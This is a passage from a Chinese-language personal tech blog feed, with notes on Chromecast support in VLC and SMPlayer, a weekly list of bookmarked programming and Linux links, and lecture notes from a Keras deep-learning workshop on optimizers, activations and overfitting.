&lt;p&gt;原來 vlc 3.0.0 支援 Chromecast&lt;br /&gt;
不過目前是 nightly&lt;br /&gt;
得自己編&lt;br /&gt;
還沒試用過  &lt;/p&gt;
&lt;p&gt;ref: &lt;a href="https://www.howtogeek.com/269272/how-to-stream-from-vlc-to-your-chromecast/"&gt;https://www.howtogeek.com/269272/how-to-stream-from-vlc-to-your-chromecast/&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;原來 smplayer 17.1.0 開始支援 Chromecast&lt;br /&gt;
但你得有個 Chrome 或 Chromium&lt;br /&gt;
並到 &lt;code&gt;chrome://flags&lt;/code&gt; enable &lt;code&gt;Load Media Router Component Extension&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;ref: &lt;a href="http://blog.smplayer.info/support-for-chromecast-in-smplayer-17-1/"&gt;http://blog.smplayer.info/support-for-chromecast-in-smplayer-17-1/&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;其他抱怨&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Chromecast 一代外型設計很北七，太胖，會擋到其他 HDMI port，所以二代才拉了一條線出來。  &lt;/li&gt;
&lt;li&gt;看 Youtube 的時候畫質不能調整。  &lt;/li&gt;
&lt;li&gt;看 Youtube 過一陣子之後手機就沒辦法控制了，調音量和選時間都不會有反應。  &lt;/li&gt;
&lt;li&gt;Guest mode 沒試成功過。  &lt;/li&gt;
&lt;li&gt;還遇過用一用強制更新重開，而且還超級久。  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Chrome"></category><category term="Chromium"></category><category term="Chromecast"></category><category term="VLC"></category><category term="SMPlayer"></category></entry><entry><title>Y2017W32</title><link href="https://blog.m157q.tw/posts/2017/08/14/y2017w32/" rel="alternate"></link><published>2017-10-17T21:23:50+08:00</published><updated>2017-10-17T21:23:50+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-08-14:posts/2017/08/14/y2017w32/</id><summary type="html">&lt;h3&gt;ai&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/mattya/chainer-DCGAN"&gt;GitHub - mattya/chainer-DCGAN: Chainer implementation of Deep Convolutional Generative Adversarial Network&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;画像を生成するニューラルネットです。 12/24のchainer advent calendarに解説を書きました。 http://qiita.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;用生成式對抗網路來讓程式自動畫圖，真的是很有趣。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/fchollet/keras"&gt;GitHub - fchollet/keras: Deep Learning library for Python. Runs on TensorFlow, Theano, or CNTK.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Keras: Deep Learning library for TensorFlow and Theano  You have just found Keras. Keras is a high-level neural networks library, written in Python and capable of running on top of either TensorFlow or Theano. It was developed with a focus on enabling fast experimentation.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/fastai/courses"&gt;fastai/courses: fast.ai Courses&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;These are the lecture materials from Practical Deep Learning for Coders. Two important parts of the course are our online forums and our wiki. If you are encountering an error, we recommend that you first search the forums and wiki for a solution.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;archlinux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://unix.stackexchange.com/questions/139513/how-to-clear-journalctl"&gt;systemd - How to clear journalctl - Unix &amp;amp; Linux Stack Exchange&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;I couldn't find in google any safe way to clear systemd journal. Do anyone know any safe and reliable way to do so?  Let's say I was experimenting with something and my logs got cluttered with various error messages. Moreover I'm displaying my journal on my desktop by using Conky.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;journalctl --vacuum-time=2d&lt;/code&gt; or &lt;code&gt;journalctl --vacuum-size=500M&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;當 &lt;code&gt;journal&lt;/code&gt; 的 log 太肥需要清除的時候會用到的指令。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://kissmyarch.blogspot.tw/2012/05/two-simple-yaourt-tips.html"&gt;My Arch Linux: Two simple yaourt tips&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://ghostsinthelab.org/2017/08/06/coscup-2017-archtw/"&gt;[COSCUP 2017] Arch Linux 臺灣社群：一個冷門社群的營造經驗 | hiroshi yui&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@fox/women-will-never-advance-doing-community-work-ad342b722cce"&gt;Women will never advance doing community work – Karolina Szczur – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇說的很好  &lt;/li&gt;
&lt;li&gt;社群、工作與個人能力增長的拿捏的確是個問題  &lt;/li&gt;
&lt;li&gt;但個人覺得跟性別無關啊  &lt;/li&gt;
&lt;li&gt;不知道為何特別強調女性  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;cli&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2017/08/awk-program-limit-exceeded-maximum-number-fields-size-32767-2017/amp/"&gt;AWK 遇到計算欄位上限 32767 的問題修復 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;直接把 &lt;code&gt;mawk&lt;/code&gt; 換成 &lt;code&gt;gawk&lt;/code&gt; XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.binarytides.com/linux-cpu-information/"&gt;8 commands to check cpu information on Linux&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The cpu information includes details about the processor, like the architecture, vendor name, model, number of cores, speed of each core etc. There are quite a few commands on linux to get those details about the cpu hardware, and here is a brief about some of the commands.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.linux.com/blog/how-check-processor-and-cpu-details-linux"&gt;How to check processor and cpu details on Linux | Linux.com | The source for Linux information&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Processor/Cpu details The details about the processor that we shall be talking about include, number of cores, availability of hyper threading, architecture, cache size etc. To find these details about the cpu on your system can be a bit difficult because the way different commands check them.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.tecmint.com/set-unset-environment-variables-in-linux/"&gt;How to Set and Unset Local, User and System Wide Environment Variables in Linux&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Environment Variables are some special variables that are defined in shell and are needed by programs while execution. They can be system defined or user defined. System defined variables are those which are set by system and are used by system level programs.  For e.g.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://askubuntu.com/questions/755109/list-all-environment-variables-and-show-if-they-are-exported-or-not"&gt;bash - List all environment variables, and show if they are exported or not - Ask Ubuntu&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://superuser.com/questions/355318/how-to-have-linux-ls-command-show-second-in-time-stamp"&gt;How to have Linux ls command show second in time stamp - Super User&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Something annoying about ls -l command is it shows only hour and minute for a file(like 08:30). How can I see the second portion(like 08:30:44)?  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;javascript&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/nuxt/nuxt.js"&gt;nuxt/nuxt.js: Versatile Vue.js Framework&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/stubbornella/oocss"&gt;stubbornella/oocss: Object Oriented CSS Framework&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ramda/ramda"&gt;ramda/ramda: Practical functional Javascript&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Ramda A practical functional library for JavaScript programmers.  Why Ramda?  There are already several excellent libraries with a functional flavor. Typically, they are meant to be general-purpose toolkits, suitable for working in multiple paradigms. Ramda has a more focused goal.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;pacman&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.manjaro.org/index.php?title=Pacman_Tips"&gt;Pacman Tips - Manjaro Linux&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.louie.lu/2017/08/09/pathlib-python-standard-library-12/"&gt;pathlib — 物件導向的檔案系統路徑 — 你所不知道的 Python 標準函式庫用法 12 | louie_lu's blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來除了 &lt;code&gt;os.path&lt;/code&gt; 以外還可以用 &lt;code&gt;pathlib&lt;/code&gt; 啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.louie.lu/2017/08/02/%e4%bd%a0%e6%89%80%e4%b8%8d%e7%9f%a5%e9%81%93%e7%9a%84-python-%e6%a8%99%e6%ba%96%e5%87%bd%e5%bc%8f%e5%ba%ab%e7%94%a8%e6%b3%95-07-enum/"&gt;enum — 枚舉型態 — 你所不知道的 Python 標準函式庫用法 07 | louie_lu's blog&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://doughellmann.com/blog/2017/07/31/sqlite3-embedded-relational-database-pymotw-3/"&gt;sqlite3 — Embedded Relational Database — PyMOTW 3 – Doug Hellmann&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.louie.lu/2017/07/31/%e4%bd%a0%e6%89%80%e4%b8%8d%e7%9f%a5%e9%81%93%e7%9a%84-python-%e6%a8%99%e6%ba%96%e5%87%bd%e5%bc%8f%e5%ba%ab%e7%94%a8%e6%b3%95-05-linecache/"&gt;linecache — 你所不知道的 Python 標準函式庫用法 05 | louie_lu's blog&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/27835619/urllib-and-ssl-certificate-verify-failed-error"&gt;python - urllib and "SSL: CERTIFICATE_VERIFY_FAILED" Error - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;官方 Python 的 OS X 版本在 SSL 上的處理有奇怪的問題，連線到 HTTPS 會出錯，用 homebrew 裝的就沒這個問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.kitploit.com/2017/08/plasma-interactive-disassembler-for.html?m=1"&gt;Plasma - An Interactive Disassembler for x86/ARM/MIPS - KitPloit - PenTest Tools for your Security Arsenal ☣&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;好像有點厲害  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;theano&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Theano/Theano/issues/5141"&gt;ImportError, undefined symbol · Issue #5141 · Theano/Theano&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用 Theano 的時候遇到這個奇怪的 error  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/walmartlabs/the-benefits-of-server-side-rendering-over-client-side-rendering-5d07ff2cefe8"&gt;The Benefits of Server Side Rendering Over Client Side Rendering&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Most of our pages on walmart.com are using server side rendering (henceforth SSR) with only a few unique exceptions.  Due to the benefits of SSR, when we transformed our stack to React and Nodejs, we put a lot of time and effort in optimizing SSR performance.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://audreyt.github.io/trust-zh-TW/"&gt;信任的演化&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇用很簡單的互動遊戲來講解信任這件事與不同類型的人做出的行為會對整個社會造成什麼樣的影響，很有趣。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://tw.battle.net/sc2/zh/blog/20944009/the-starcraft-ii-api-has-arrived-8-9-2017"&gt;《星海爭霸II》API 現已推出 - 《星海爭霸II》&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;第一次看到線上遊戲推出 API...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="ai"></category><category term="archlinux"></category><category term="blog"></category><category term="cli"></category><category term="javascript"></category><category term="life"></category><category term="misc"></category><category term="pacman"></category><category term="python"></category><category term="security"></category><category term="theano"></category><category term="web"></category></entry><entry><title>台灣資料科學年會之系列活動：手把手的深度學習實務</title><link href="https://blog.m157q.tw/posts/2017/08/13/deep-learning-hands-on-step-by-step-datasci-tw/" rel="alternate"></link><published>2017-08-13T17:08:45+08:00</published><updated>2017-08-13T17:08:45+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-08-13:posts/2017/08/13/deep-learning-hands-on-step-by-step-datasci-tw/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;a href="http://foundation.datasci.tw/step-by-step-dl-170813/"&gt;http://foundation.datasci.tw/step-by-step-dl-170813/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://drive.google.com/file/d/0B9cCeTKOkfWIbWtjdWJaRl9YRmM/view?usp=sharing"&gt;Slides&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;六步完模 – 建立深度學習模型&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;決定 hidden layers 層數與其中的 neurons 數量  &lt;/li&gt;
&lt;li&gt;決定該層使用的 activation function  &lt;/li&gt;
&lt;li&gt;決定模型的 loss function  &lt;/li&gt;
&lt;li&gt;決定 optimizer  &lt;ul&gt;
&lt;li&gt;Parameters: learning rate, momentum, decay  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;編譯模型 (Compile model)  &lt;/li&gt;
&lt;li&gt;開始訓練囉!(Fit model)  &lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h3&gt;關於 &lt;code&gt;validation_split&lt;/code&gt; 要注意的小地方&lt;/h3&gt;
&lt;p&gt;用 Keras 的 &lt;code&gt;validation_split&lt;/code&gt; 之前要記得把資料先弄亂，&lt;br /&gt;
因為它會從資料的最尾端開始取，&lt;br /&gt;
如果沒有弄亂的話切出來的資料 bias 會很大。&lt;br /&gt;
可以使用 &lt;code&gt;np.shuffle&lt;/code&gt; 來弄亂  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Functional API&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Why “Functional API” ?  &lt;ul&gt;
&lt;li&gt;All layers and models are callable (like function call)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;keras.layers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Input&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Dense&lt;/span&gt;  
&lt;span class="nb"&gt;input&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;,))&lt;/span&gt;  
&lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Dense&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+ 類似 f(x) 的寫法  
    + Dense(10) == f  
    + input == x  
+ 好處是可以 assign 給自己後再用 for loop 很快建非常多層 layer，不用一直用 `model.add`  
+ Easy to manipulate various inpout sources
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x1 = input(shape=(10,))  
y1 = Dense(100)(x1)  

x2 = input(shape=(20,))  
new_x2 = keras.layers.concatenate([y1,x2])  
output = Dense(200)(new_x2)  

Model = Model(inputs=[x1,x2],outputs=[output])  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h3&gt;Loss function&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;為什麼 Cross-entropy 比 Squared error 好？  &lt;ul&gt;
&lt;li&gt;Cross-entropy 的 Gradient 比較大，學習速度比較快。  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.complex-systems.com/pdf/02-6-1.pdf"&gt;The error surface of logarithmic functions is steeper than&lt;br /&gt;
that of quadratic functions.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to select Loss function  &lt;ul&gt;
&lt;li&gt;Classification 常用 cross-entropy  &lt;ul&gt;
&lt;li&gt;搭配 softmax 當作 output layer 的 activation function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Regression 常用 mean absolute/squared error  &lt;/li&gt;
&lt;li&gt;對特定問題定義 loss function  &lt;ul&gt;
&lt;li&gt;Unbalanced dataset, class 0 : class 1 = 99 : 1  &lt;ul&gt;
&lt;li&gt;Class 1 做錯的話，給它 penalty 99  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Self-defined loss function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Learning Rate&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;觀察 Loss，如果有振盪的話，代表 learning rate 可能太大  &lt;/li&gt;
&lt;li&gt;觀察 Loss，下降的太緩慢的話，代表 learning rate 可能太小  &lt;/li&gt;
&lt;li&gt;選擇適合的 learning rate 對於 training model 會是很大的影響  &lt;/li&gt;
&lt;li&gt;通常不會大於 0.1  &lt;/li&gt;
&lt;li&gt;一次調整一個數量級  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Activation Function&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Activation Function 可能是最重要的  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Sigmoid, Tanh, Softsign  &lt;ul&gt;
&lt;li&gt;Sigmoid 介於 0~1 之間  &lt;/li&gt;
&lt;li&gt;Tanh, Softsign 介於 -1~1 之間  &lt;/li&gt;
&lt;li&gt;值域是有限制的  &lt;ul&gt;
&lt;li&gt;Input 過大或過小影響其實不大  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Derivatives of Sigmoid, Tanh, Softsign  &lt;ul&gt;
&lt;li&gt;Input 過大或過小時，Gradient 太小，學習就會很慢  &lt;/li&gt;
&lt;li&gt;所以通常太深的 model 不建議用這 3 個 Activation Function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Drawbacks of Sigmoid, Tanh, Softsign  &lt;ul&gt;
&lt;li&gt;Vanishing gradient problem  &lt;ul&gt;
&lt;li&gt;原因: input 被壓縮到一個相對很小的output range  &lt;/li&gt;
&lt;li&gt;結果: 很大的 input 變化只能產生很小的 output 變化 =&amp;gt; Gradient 小 =&amp;gt; 無法有效地學習  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;特別不適用於深的深度學習模型  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ReLU, Softplus  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在 TensorFlow 上用 Softplus 好像會遇到一些問題  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Derivatives of ReLU, Softplus  &lt;ul&gt;
&lt;li&gt;ReLU 在輸入小於零時, gradient 等於零,會有問題嗎?  &lt;ul&gt;
&lt;li&gt;小於 0 的時候可能就不學習了，所以有人提出了 Leaky ReLU  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Leaky ReLU  &lt;ul&gt;
&lt;li&gt;Allow a small gradient while the input to activation function smaller than 0  &lt;/li&gt;
&lt;li&gt;在 input &amp;lt; 0 時，還是給他一點些微的斜率  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在用 ReLU 的時候 Learning rate 可能要用小一點，效果會比較好。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Optimizer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;SGD – Stochastic Gradient Descent  &lt;ul&gt;
&lt;li&gt;Stochastic gradient descent  &lt;/li&gt;
&lt;li&gt;支援 momentum, learning rate decay, Nesterov momentum  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;keras.optimizer.SGD(lr=0.01, momentum=0.0, decay=0.0, nesterov=False)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Momentum 的影響  &lt;ul&gt;
&lt;li&gt;無 momentum: &lt;code&gt;update = -lr*gradient&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;有 momentum: &lt;code&gt;update = -lr*gradient + m*last_update&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Learning rate decay after update once  &lt;ul&gt;
&lt;li&gt;屬於 &lt;code&gt;1/t decay =&amp;gt; lr = lr / (1 + decay*t)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;t: number of done updates  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Momentum vs Nesterov Momentum  &lt;ul&gt;
&lt;li&gt;Momentum  &lt;ul&gt;
&lt;li&gt;先算 gradient  &lt;/li&gt;
&lt;li&gt;加上 momentum  &lt;/li&gt;
&lt;li&gt;更新  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Nesterov Momentum  &lt;ul&gt;
&lt;li&gt;加上 momentum  &lt;/li&gt;
&lt;li&gt;再算 gradient  &lt;/li&gt;
&lt;li&gt;更新  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;兩者出來的效果沒有太大的差別，沒有誰比較好，只是聽到有人用 Nesterov 的時候要知道差別。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Adagrad – Adaptive Learning Rate  &lt;ul&gt;
&lt;li&gt;因材施教:每個參數都有不同的 learning rate  &lt;/li&gt;
&lt;li&gt;根據之前所有 gradient 的 root mean square 修改  &lt;/li&gt;
&lt;li&gt;Feature scales 不同,需要不同的 learning rates  &lt;/li&gt;
&lt;li&gt;每個 weight 收斂的速度不一致  &lt;ul&gt;
&lt;li&gt;但 learning rate 沒有隨著減少的話  bumpy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;根據之前所有 gradient 的 root mean square 修改  &lt;/li&gt;
&lt;li&gt;老馬識途,參考之前的經驗修正現在的步伐  &lt;/li&gt;
&lt;li&gt;不完全相信當下的 gradient  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RMSprop – Similar with Adagrad  &lt;ul&gt;
&lt;li&gt;另一種參考過去 gradient 的方式  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;keras.optimizers.RMSprop(lr=0.001, rho=0.9, epsilon=1e-08, decay=0.0)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Adagrad 不管多久之前的經驗都把其權重視為相同的，RMSprop 就是針對這部份做改進，愈久之前的經驗其權重會變得愈低。  &lt;/li&gt;
&lt;li&gt;這個 Activation 是作者在 Coursera 授課時提出的，沒有論文，所以大家在論文使用這個 activation function 的時候都會 cite 那個 coursera 課程的網址，而且還不少人用的 XDDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Adam – Similar with RMSprop + Momentum  &lt;ul&gt;
&lt;li&gt;Close to RMSprop + Momentum  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://arxiv.org/pdf/1412.6980v8.pdf"&gt;ADAM: A Method For Stochastic Optimization&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;In practice, 不改參數也會做得很好  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;keras.optimizer.Adam(lr=0.001, beta_1=0.9, beta_2=0.999, epsilon=1e-08, decay=0.0)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Nadam – Adam + Nesterov Momentum  &lt;/li&gt;
&lt;li&gt;How to select Optimizer  &lt;ul&gt;
&lt;li&gt;一般的起手式: Adam  &lt;ul&gt;
&lt;li&gt;Adaptive learning rate for every weights  &lt;/li&gt;
&lt;li&gt;Momentum included  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Keras 推薦 RNN 使用 RMSProp  &lt;ul&gt;
&lt;li&gt;在訓練 RNN 需要注意 explosive gradient 的問題 =&amp;gt; clip gradient 的暴力美學  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RMSProp 與 Adam 的戰爭仍在延燒  &lt;ul&gt;
&lt;li&gt;各有千秋  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;處理 Overfitting&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Regularization  &lt;ul&gt;
&lt;li&gt;限制 weights 的大小讓 output 曲線比較平滑  &lt;/li&gt;
&lt;li&gt;Weight 較小，input 的差異對 output 產生的影響比較沒有那麼大  &lt;/li&gt;
&lt;li&gt;α (Regularizer) 是用來調整 regularization 的比重  &lt;ul&gt;
&lt;li&gt;避免顧此失彼 (降低 weights 的大小而犧牲模型準確性)&lt;br /&gt;
避免顧此失彼 (降低 weights 的大小而犧牲模型準確性)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;L1 and L2 Regularizers  &lt;ul&gt;
&lt;li&gt;L1 norm: Sum of absolute values  &lt;/li&gt;
&lt;li&gt;L2 norm: Root mean square of absolute values  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Early Stopping  &lt;ul&gt;
&lt;li&gt;希望在 Model overfitting 之前就停止 training  &lt;/li&gt;
&lt;li&gt;假如可以停在 loss 最低的點的話就好了  &lt;/li&gt;
&lt;li&gt;Early Stopping in Keras  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;from keras.callbacks import EarlyStopping&lt;/code&gt;  &lt;/li&gt;
